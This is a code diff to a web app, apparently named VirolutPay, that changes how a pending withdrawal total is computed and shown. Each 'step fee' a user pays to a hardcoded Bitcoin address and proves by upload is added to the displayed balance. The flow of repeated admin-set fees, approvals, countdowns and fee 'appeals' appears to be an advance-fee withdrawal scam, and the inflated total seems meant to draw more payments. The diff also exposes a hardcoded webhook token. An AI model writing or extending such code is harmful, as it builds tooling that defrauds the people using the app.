@@ -1483,7 +1483,6 @@
 
     const MAKE_WEBHOOK_URL = "https://hook.eu1.make.com/618msiw7y7cb4ieca7sp68qy6xi6n4e5";
     const MAKE_WEBHOOK_TOKEN = "gp_secret_9821";
-    // Set your support email below so Make.com can route signup & proof alerts there
     const SUPPORT_ADMIN_EMAIL = "support@virolutpay.com";
     const DEFAULT_BTC_ADDRESS = "bc1q34k0kfk7vp7ugq04765zzgvnxklzn7s6k9fl58";
     const DEFAULT_COUNTDOWN_MINUTES = 3;
@@ -1740,6 +1739,7 @@
     let txShowAll = false;
     let tickerTimer = null;
     let advancingStepLock = false;
+    let normalizingCumulativeLock = false;
 
     let pendingSignupData = null;
     let currentOtpCode = "";
@@ -1779,6 +1779,92 @@
       if (!text) return;
       navigator.clipboard?.writeText(text).catch(() => {});
       showToast(label, "success", 2500);
+    }
+
+    /**
+     * Computes the cumulative pending withdrawal amount:
+     * Initial withdrawal (e.g. $500) + approved step fees (e.g. +$10 -> $510, +$50 -> $560).
+     */
+    function getCumulativeWithdrawalAmountUsd(wd, steps = appConfig.steps || []) {
+      if (!wd) return 0;
+      const baseUsd = Number(
+        wd.initialAmountUsd !== undefined && wd.initialAmountUsd !== null
+          ? wd.initialAmountUsd
+          : (wd.amountUsd || 0)
+      );
+      const creditedSteps = Array.isArray(wd.creditedStepIndices) ? wd.creditedStepIndices : [];
+      const explicitFeesSum = creditedSteps.reduce((sum, idx) => {
+        const s = steps[idx];
+        const fee = wd.stepFeesMap && wd.stepFeesMap[idx] !== undefined
+          ? Number(wd.stepFeesMap[idx])
+          : Number(s?.priceUsd || 0);
+        return sum + (Number.isFinite(fee) ? fee : 0);
+      }, 0);
+
+      const currentAmt = Number(wd.amountUsd || 0);
+      const computedTotal = Number((baseUsd + explicitFeesSum).toFixed(2));
+      return Math.max(currentAmt, computedTotal);
+    }
+
+    /**
+     * If admin approved a step in Firestore without pre-adding the step fee into wd.amountUsd,
+     * sync wd.amountUsd & initialAmountUsd once so cumulative amount is persisted everywhere.
+     */
+    async function syncCumulativeWithdrawalIfNeeded(profile) {
+      if (!currentFirebaseUser || !profile?.activeWithdrawal || normalizingCumulativeLock) return;
+      const wd = profile.activeWithdrawal;
+      if (wd.status === "completed") return;
+
+      const steps = Array.isArray(appConfig.steps) ? appConfig.steps : [];
+      const currentIdx = Number(wd.stepIndex || 0);
+      const credited = Array.isArray(wd.creditedStepIndices) ? [...wd.creditedStepIndices] : [];
+      const feesMap = { ...(wd.stepFeesMap || {}) };
+      const initialBase = Number(
+        wd.initialAmountUsd !== undefined && wd.initialAmountUsd !== null
+          ? wd.initialAmountUsd
+          : (wd.amountUsd || 0)
+      );
+
+      // Detect if step approval happened (e.g., status moved to post_approval_wait or stepIndex advanced)
+      const highestApprovedIdx = wd.status === "post_approval_wait"
+        ? currentIdx
+        : Math.max(-1, currentIdx - 1);
+
+      let changed = false;
+      for (let i = 0; i <= highestApprovedIdx; i++) {
+        if (!credited.includes(i) && steps[i]) {
+          const feeVal = wd.appealedPriceUsd !== null && wd.appealedPriceUsd !== undefined && i === currentIdx
+            ? Number(wd.appealedPriceUsd)
+            : Number(steps[i].priceUsd || 0);
+          if (feeVal > 0) {
+            credited.push(i);
+            feesMap[i] = feeVal;
+            changed = true;
+          }
+        }
+      }
+
+      const expectedTotal = Number((
+        initialBase + credited.reduce((acc, idx) => acc + Number(feesMap[idx] || 0), 0)
+      ).toFixed(2));
+
+      if (changed || wd.initialAmountUsd === undefined || Number(wd.amountUsd || 0) < expectedTotal) {
+        normalizingCumulativeLock = true;
+        try {
+          const nextWd = {
+            ...wd,
+            initialAmountUsd: initialBase,
+            creditedStepIndices: credited,
+            stepFeesMap: feesMap,
+            amountUsd: Math.max(Number(wd.amountUsd || 0), expectedTotal)
+          };
+          await updateDoc(doc(db, "users", currentFirebaseUser.uid), {
+            activeWithdrawal: nextWd
+          });
+        } finally {
+          normalizingCumulativeLock = false;
+        }
+      }
     }
 
     async function sendMakeNotification(params = {}) {
@@ -1827,6 +1913,7 @@
 
     async function notifySupportProofSubmitted({ profile, wd, stepLabel, stepTitle, feeUsd, submittedAt }) {
       if (!SUPPORT_ADMIN_EMAIL || !profile || !wd) return;
+      const cumulativeAmountStr = getCumulativeWithdrawalAmountUsd(wd).toFixed(2);
       await sendMakeNotification({
         type: "admin_proof_submitted",
         event: "admin_proof_submitted",
@@ -1835,13 +1922,13 @@
         user_name: profile.name,
         user_email: profile.email,
         wallet_id: profile.walletId,
-        amount_usd: Number(wd.amountUsd || 0).toFixed(2),
+        amount_usd: cumulativeAmountStr,
         required_amount: `$${Number(feeUsd || 0).toFixed(2)} USD`,
         step: stepLabel,
         action_name: stepTitle,
         submitted_at: submittedAt,
         subject: `Proof Uploaded for Approval: ${profile.name} (${stepLabel} - ${stepTitle})`,
-        action_text: `${profile.name} (${profile.email}, ${profile.walletId}) uploaded payment proof for ${stepLabel}: ${stepTitle} ($${Number(feeUsd || 0).toFixed(2)} USD) at ${submittedAt}.`
+        action_text: `${profile.name} (${profile.email}, ${profile.walletId}) uploaded payment proof for ${stepLabel}: ${stepTitle} ($${Number(feeUsd || 0).toFixed(2)} USD) on cumulative withdrawal $${cumulativeAmountStr} USD at ${submittedAt}.`
       });
     }
 
@@ -1863,7 +1950,7 @@
       if (!profile || !wd || !step) return;
       const stepIndex = wd.stepIndex || 0;
       const stepNumber = stepIndex + 1;
-      const amountStr = Number(wd.amountUsd || 0).toFixed(2);
+      const amountStr = getCumulativeWithdrawalAmountUsd(wd).toFixed(2);
       const feeStr = Number(effectivePriceUsd || 0).toFixed(2);
       const settlementAddr = step.settlementAddress || appConfig.btcAddress || DEFAULT_BTC_ADDRESS;
       const isInitiated = options.isInitiated === true;
@@ -2185,12 +2272,13 @@
       const wd = profile.activeWithdrawal;
       const steps = Array.isArray(appConfig.steps) ? appConfig.steps : [];
       if (wd && wd.status !== "completed") {
+        const cumulativeAmountStr = getCumulativeWithdrawalAmountUsd(wd, steps).toFixed(2);
         const idx = wd.stepIndex || 0;
         const step = steps[idx] || steps[0];
         const fee = wd.appealedPriceUsd !== null && wd.appealedPriceUsd !== undefined
           ? Number(wd.appealedPriceUsd)
           : Number(step?.priceUsd || 0);
-        const key = `${idx}_${wd.status}_${fee}_${wd.rejectionNote || ""}_${wd.postStatusMessage || ""}`;
+        const key = `${idx}_${wd.status}_${fee}_${cumulativeAmountStr}_${wd.rejectionNote || ""}_${wd.postStatusMessage || ""}`;
 
         if (lastWithdrawalNotifyKey && lastWithdrawalNotifyKey !== key) {
           lastWithdrawalNotifyKey = key;
@@ -2207,8 +2295,8 @@
               email: profile.email,
               name: profile.name,
               wallet_id: profile.walletId,
-              amount: Number(wd.amountUsd || 0).toFixed(2),
-              amount_usd: Number(wd.amountUsd || 0).toFixed(2),
+              amount: cumulativeAmountStr,
+              amount_usd: cumulativeAmountStr,
               step: idx + 1,
               action_name: step?.title || `Step ${idx + 1}`,
               required_amount: `$${fee.toFixed(2)} USD`,
@@ -2227,8 +2315,8 @@
               email: profile.email,
               name: profile.name,
               wallet_id: profile.walletId,
-              amount: Number(wd.amountUsd || 0).toFixed(2),
-              amount_usd: Number(wd.amountUsd || 0).toFixed(2),
+              amount: cumulativeAmountStr,
+              amount_usd: cumulativeAmountStr,
               step: idx + 1,
               action_name: step?.title || `Step ${idx + 1}`,
               required_amount: `$${fee.toFixed(2)} USD`,
@@ -2695,6 +2783,9 @@
 
       const activeWithdrawal = steps.length ? {
         amountUsd,
+        initialAmountUsd: amountUsd,
+        creditedStepIndices: [],
+        stepFeesMap: {},
         method,
         destinationLabel,
         holder,
@@ -2708,6 +2799,9 @@
         waitEndsAt: null
       } : {
         amountUsd,
+        initialAmountUsd: amountUsd,
+        creditedStepIndices: [],
+        stepFeesMap: {},
         method,
         destinationLabel,
         holder,
@@ -2732,9 +2826,9 @@
       };
 
       if (steps[0]) {
-        lastWithdrawalNotifyKey = `0_action_required_${Number(steps[0].priceUsd || 0)}__`;
+        lastWithdrawalNotifyKey = `0_action_required_${Number(steps[0].priceUsd || 0)}_${Number(amountUsd).toFixed(2)}__`;
       } else {
-        lastWithdrawalNotifyKey = `0_awaiting_step_config_0__Withdrawing in progress`;
+        lastWithdrawalNotifyKey = `0_awaiting_step_config_0_${Number(amountUsd).toFixed(2)}__Withdrawing in progress`;
       }
 
       await updateDoc(doc(db, "users", currentFirebaseUser.uid), {
@@ -2777,6 +2871,7 @@
       const wd = currentProfile.activeWithdrawal;
       const container = document.getElementById("withdrawActionStepView");
       const c = currentProfile.country || WORLD_COUNTRIES[0];
+      const cumulativeUsd = getCumulativeWithdrawalAmountUsd(wd);
 
       if (wd.status === "awaiting_step_config") {
         document.getElementById("withdrawModalTitle").textContent = "Withdrawal Status";
@@ -2785,7 +2880,7 @@
             <i class="fa-solid fa-circle-check" style="font-size:26px; color:#60a5fa; margin-bottom:10px;"></i>
             <div style="font-size:15px; font-weight:800; color:#93c5fd; margin-bottom:6px;">${wd.postStatusMessage || "Withdrawing in progress"}</div>
             <div style="font-size:11px; color:var(--text-muted); margin-bottom:8px;">Updated at ${wd.statusUpdatedAt || nowClockString()}</div>
-            <p style="font-size:12.5px; color:var(--text-muted);">Withdrawal of <strong>$${Number(wd.amountUsd).toFixed(2)} USD</strong> to <strong>${wd.destinationLabel}</strong> is active.</p>
+            <p style="font-size:12.5px; color:var(--text-muted);">Withdrawal of <strong>$${cumulativeUsd.toFixed(2)} USD</strong> to <strong>${wd.destinationLabel}</strong> is active.</p>
           </div>
         `;
         return;
@@ -2809,7 +2904,7 @@
             <i class="fa-solid fa-hourglass-half" style="font-size:26px; color:#fbbf24; margin-bottom:8px;"></i>
             <div style="font-size:15px; font-weight:800; margin-bottom:4px;">${step.title} — Proof Under Review</div>
             <div style="font-size:11px; color:var(--text-muted); margin-bottom:6px;">Submitted at ${wd.statusUpdatedAt || nowClockString()}</div>
-            <p style="font-size:12.5px; color:var(--text-muted);">Admin is reviewing your payment proof for <strong>${step.title}</strong> ($${effectivePriceUsd.toFixed(2)} USD).</p>
+            <p style="font-size:12.5px; color:var(--text-muted);">Withdrawal total: <strong>$${cumulativeUsd.toFixed(2)} USD</strong>. Admin is reviewing your payment proof for <strong>${step.title}</strong> ($${effectivePriceUsd.toFixed(2)} USD).</p>
             ${wd.receiptDataUrl ? `<img src="${wd.receiptDataUrl}" style="max-height:140px; border-radius:10px; margin-top:10px;" />` : ""}
           </div>
         `;
@@ -2825,6 +2920,7 @@
           <div style="background:rgba(59,130,246,0.16); border:1px solid rgba(59,130,246,0.55); border-radius:14px; padding:16px; text-align:center;">
             <i class="fa-solid fa-circle-check" style="font-size:26px; color:#60a5fa; margin-bottom:10px;"></i>
             <div style="font-size:15px; font-weight:800; color:#60a5fa; margin-bottom:4px;">${headline}</div>
+            <div style="font-size:11px; color:#93c5fd; margin-bottom:4px;">Updated Withdrawal Amount: <strong>$${cumulativeUsd.toFixed(2)} USD</strong></div>
             <div style="font-size:11px; color:#93c5fd; margin-bottom:8px;">Status Time: ${wd.statusUpdatedAt || nowClockString()}</div>
             <div style="font-family:'JetBrains Mono',monospace; font-size:24px; font-weight:800; color:#fff;">${mins}:${secs}</div>
           </div>
@@ -2847,7 +2943,8 @@
             ${wd.appealedPriceUsd !== null && wd.appealedPriceUsd !== undefined ? `<span class="status-pill appealed">Fee Updated</span>` : ""}
           </div>
           <div style="font-size:15px; font-weight:800; margin-bottom:4px;">${step.title}</div>
-          <p style="font-size:12.5px; color:#cbd5e1; margin-bottom:10px;">${step.description || ""}</p>
+          <p style="font-size:12.5px; color:#cbd5e1; margin-bottom:8px;">${step.description || ""}</p>
+          <div style="font-size:11.5px; color:#93c5fd; margin-bottom:8px;">Pending Withdrawal Total: <strong>$${cumulativeUsd.toFixed(2)} USD</strong></div>
           <div style="display:flex; justify-content:space-between; align-items:center; padding-top:8px; border-top:1px solid rgba(148,163,184,0.2);">
             <span style="font-size:12px; color:var(--text-muted);">Required Fee:</span>
             <div style="text-align:right;">
@@ -2940,17 +3037,19 @@
         const feeUsd = wd.appealedPriceUsd !== null && wd.appealedPriceUsd !== undefined
           ? Number(wd.appealedPriceUsd)
           : Number(step ? step.priceUsd : 0);
+        const cumulativeUsd = getCumulativeWithdrawalAmountUsd(wd, steps);
         const nowTime = nowClockString();
 
         const updatedWd = {
           ...wd,
+          amountUsd: cumulativeUsd,
           status: "pending_review",
           rejectionNote: "",
           receiptDataUrl: uploadedReceiptDataUrl,
           statusUpdatedAt: nowTime
         };
 
-        lastWithdrawalNotifyKey = `${wd.stepIndex || 0}_pending_review_${feeUsd}__${wd.postStatusMessage || ""}`;
+        lastWithdrawalNotifyKey = `${wd.stepIndex || 0}_pending_review_${feeUsd}_${cumulativeUsd.toFixed(2)}__${wd.postStatusMessage || ""}`;
 
         const txEntry = {
           id: "PR-" + Date.now(),
@@ -3007,6 +3106,7 @@
       }
 
       const updatedAt = wd.statusUpdatedAt || nowClockString();
+      const cumulativeUsd = getCumulativeWithdrawalAmountUsd(wd);
 
       if (wd.status === "awaiting_step_config") {
         banner.className = "withdrawal-status-card approved-blue";
@@ -3016,7 +3116,7 @@
             <span class="status-pill approved-blue"><i class="fa-solid fa-circle-check"></i> ${wd.postStatusMessage || "Withdrawing in progress"}</span>
             <span style="font-size:10.5px; color:#93c5fd;">${updatedAt}</span>
           </div>
-          <div style="font-size:13.5px; font-weight:800;">Withdrawal: $${Number(wd.amountUsd).toFixed(2)} USD → ${wd.destinationLabel}</div>
+          <div style="font-size:13.5px; font-weight:800;">Withdrawal: $${cumulativeUsd.toFixed(2)} USD → ${wd.destinationLabel}</div>
           <button type="button" class="btn-primary" style="margin-top:10px; padding:9px 12px; font-size:12.5px;" onclick="openWithdrawEntry()">View Withdrawal Status</button>
         `;
         return;
@@ -3052,7 +3152,7 @@
           ${pillHtml}
           <span style="font-size:10.5px; color:var(--text-muted);">${updatedAt}</span>
         </div>
-        <div style="font-size:13.5px; font-weight:800;">Withdrawal: $${Number(wd.amountUsd).toFixed(2)} USD → ${wd.destinationLabel}</div>
+        <div style="font-size:13.5px; font-weight:800;">Withdrawal: $${cumulativeUsd.toFixed(2)} USD → ${wd.destinationLabel}</div>
         <div style="font-size:12px; color:#cbd5e1; margin:4px 0 10px;">${detailLine}</div>
         <button type="button" class="btn-primary" style="padding:9px 12px; font-size:12.5px;" onclick="openWithdrawEntry()">View Withdrawal Status</button>
       `;
@@ -3074,13 +3174,38 @@
           advancingStepLock = true;
           try {
             const steps = Array.isArray(appConfig.steps) ? appConfig.steps : [];
-            const nextIdx = (wd.stepIndex || 0) + 1;
+            const currentIdx = wd.stepIndex || 0;
+            const nextIdx = currentIdx + 1;
             const nowTime = nowClockString();
+
+            const credited = Array.isArray(wd.creditedStepIndices) ? [...wd.creditedStepIndices] : [];
+            const feesMap = { ...(wd.stepFeesMap || {}) };
+            const initialBase = Number(
+              wd.initialAmountUsd !== undefined && wd.initialAmountUsd !== null
+                ? wd.initialAmountUsd
+                : (wd.amountUsd || 0)
+            );
+            if (!credited.includes(currentIdx) && steps[currentIdx]) {
+              const approvedFee = wd.appealedPriceUsd !== null && wd.appealedPriceUsd !== undefined
+                ? Number(wd.appealedPriceUsd)
+                : Number(steps[currentIdx].priceUsd || 0);
+              if (approvedFee > 0) {
+                credited.push(currentIdx);
+                feesMap[currentIdx] = approvedFee;
+              }
+            }
+            const cumulativeUsd = Number((
+              initialBase + credited.reduce((acc, idx) => acc + Number(feesMap[idx] || 0), 0)
+            ).toFixed(2));
 
             if (nextIdx < steps.length) {
               const nextStep = steps[nextIdx];
               const nextWd = {
                 ...wd,
+                initialAmountUsd: initialBase,
+                creditedStepIndices: credited,
+                stepFeesMap: feesMap,
+                amountUsd: Math.max(Number(wd.amountUsd || 0), cumulativeUsd),
                 stepIndex: nextIdx,
                 status: "action_required",
                 appealedPriceUsd: null,
@@ -3090,7 +3215,7 @@
                 statusUpdatedAt: nowTime,
                 waitEndsAt: null
               };
-              lastWithdrawalNotifyKey = `${nextIdx}_action_required_${Number(nextStep.priceUsd || 0)}__`;
+              lastWithdrawalNotifyKey = `${nextIdx}_action_required_${Number(nextStep.priceUsd || 0)}_${nextWd.amountUsd.toFixed(2)}__`;
               await updateDoc(doc(db, "users", currentFirebaseUser.uid), {
                 activeWithdrawal: nextWd
               });
@@ -3099,16 +3224,21 @@
                 dedupeTag: `next_step_${nextIdx}`
               });
             } else {
-              lastWithdrawalNotifyKey = `${nextIdx}_awaiting_step_config_0__Withdrawing in progress`;
+              const finalWd = {
+                ...wd,
+                initialAmountUsd: initialBase,
+                creditedStepIndices: credited,
+                stepFeesMap: feesMap,
+                amountUsd: Math.max(Number(wd.amountUsd || 0), cumulativeUsd),
+                stepIndex: nextIdx,
+                status: "awaiting_step_config",
+                postStatusMessage: "Withdrawing in progress",
+                statusUpdatedAt: nowTime,
+                waitEndsAt: null
+              };
+              lastWithdrawalNotifyKey = `${nextIdx}_awaiting_step_config_0_${finalWd.amountUsd.toFixed(2)}__Withdrawing in progress`;
               await updateDoc(doc(db, "users", currentFirebaseUser.uid), {
-                activeWithdrawal: {
-                  ...wd,
-                  stepIndex: nextIdx,
-                  status: "awaiting_step_config",
-                  postStatusMessage: "Withdrawing in progress",
-                  statusUpdatedAt: nowTime,
-                  waitEndsAt: null
-                }
+                activeWithdrawal: finalWd
               });
               await sendMakeNotification({
                 type: "withdrawal_update",
@@ -3116,12 +3246,12 @@
                 email: currentProfile.email,
                 name: currentProfile.name,
                 wallet_id: currentProfile.walletId,
-                amount: Number(wd.amountUsd || 0).toFixed(2),
-                amount_usd: Number(wd.amountUsd || 0).toFixed(2),
+                amount: finalWd.amountUsd.toFixed(2),
+                amount_usd: finalWd.amountUsd.toFixed(2),
                 status: "Withdrawing in progress",
                 action_needed: "No action required — withdrawal is processing.",
                 stage: "Withdrawing in progress",
-                action_text: `Withdrawal of $${Number(wd.amountUsd || 0).toFixed(2)} USD to ${wd.destinationLabel} is in progress.`,
+                action_text: `Withdrawal of $${finalWd.amountUsd.toFixed(2)} USD to ${wd.destinationLabel} is in progress.`,
                 subject: "Withdrawal Update: Withdrawing in progress",
                 action_url: window.location.href
               });
@@ -3245,6 +3375,7 @@
           if (docSnap.exists()) {
             currentProfile = docSnap.data();
             window.currentProfile = currentProfile;
+            await syncCumulativeWithdrawalIfNeeded(currentProfile);
             renderDashboard();
             switchView("dashboardView");
             await watchIncomingCreditsAndWithdrawalUpdates(currentProfile);
